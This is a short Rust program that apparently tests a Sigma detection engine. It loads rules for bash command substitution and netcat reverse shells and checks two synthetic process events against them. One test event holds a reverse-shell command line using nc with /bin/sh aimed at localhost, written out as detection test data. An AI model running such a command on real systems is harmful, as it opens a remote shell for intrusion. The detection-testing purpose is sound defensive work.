use null_sigma::engine::SigmaEngine;
use std::collections::HashMap;

fn main() {
    let mut engine = SigmaEngine::new();
    engine.load_rule(&std::fs::read_to_string("../lib/sigma-rules/05_bash_command_substitution.yml").unwrap()).unwrap();
    engine.load_rule(&std::fs::read_to_string("../lib/sigma-rules/04_netcat_or_reverse_shell.yml").unwrap()).unwrap();
    
    let mut ev_bash: HashMap<String, String> = HashMap::new();
    ev_bash.insert("category".to_string(), "process_creation".to_string());
    ev_bash.insert("product".to_string(), "linux".to_string());
    ev_bash.insert("TargetFilename".to_string(), "/bin/bash".to_string());
    ev_bash.insert("CommandLine".to_string(), "bash -c whoami".to_string());
    ev_bash.insert("User".to_string(), "parallels".to_string());
    
    let res = engine.evaluate_event(&ev_bash);
    println!("Bash matched: {:?}", res);
    
    let mut ev_nc: HashMap<String, String> = HashMap::new();
    ev_nc.insert("category".to_string(), "process_creation".to_string());
    ev_nc.insert("product".to_string(), "linux".to_string());
    ev_nc.insert("TargetFilename".to_string(), "/usr/bin/nc".to_string());
    ev_nc.insert("CommandLine".to_string(), "nc -e /bin/sh 127.0.0.1 4444".to_string());
    ev_nc.insert("User".to_string(), "parallels".to_string());
    
    let res2 = engine.evaluate_event(&ev_nc);
    println!("NC matched: {:?}", res2);
}
